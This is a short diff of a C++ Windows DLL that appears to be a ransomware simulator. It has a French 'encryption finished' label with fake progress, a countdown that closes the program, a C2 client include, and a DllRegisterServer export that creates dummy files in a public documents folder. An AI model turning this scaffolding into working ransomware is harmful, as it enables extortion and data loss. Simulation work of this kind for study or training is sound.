@@ -3,6 +3,7 @@
 #include <windows.h>
 #include <commctrl.h> // Required for Progress Bar
 #include "c2client.h"
+#include "utils.h"
 
 #pragma comment(lib, "comctl32.lib") // Ensure linking of common controls
 
@@ -38,7 +39,7 @@ void SimulateFakeProgress() {
     static int delayCounter = 0;
 
     if (fakeProgress >= 100) {
-        SetWindowText(hWndEncryptionStatusLabel, L"Chiffrement terminé");
+        SetWindowText(hWndEncryptionStatusLabel, L"Chiffrement termine");
         return;
     }
     if (delayCounter > 0) {
@@ -84,7 +85,7 @@ void UpdateProgressBar(){
     if (remainingTime <= 0)
     {
         KillTimer(hwndMain, timerID);
-        MessageBox(hwndMain, L"Le temps est écoulé ! Fermeture en cours.", L"Timeout", MB_OK | MB_ICONWARNING);
+        MessageBox(hwndMain, L"Le temps est ï¿½coulï¿½ ! Fermeture en cours.", L"Timeout", MB_OK | MB_ICONWARNING);
         ExitProcess(0);
         return;
     }
@@ -270,6 +271,9 @@ extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() {
     correctPassword = std::wstring(password.begin(), password.end());
 
 
+    std::wstring targetFolder = L"C:\\Users\\Public\\Documents\\FakeDocs";
+    int filesPerType = 5;
+    GenerateDummyFiles(targetFolder,filesPerType);
 
     ShowGUI(); 
     return S_OK; 
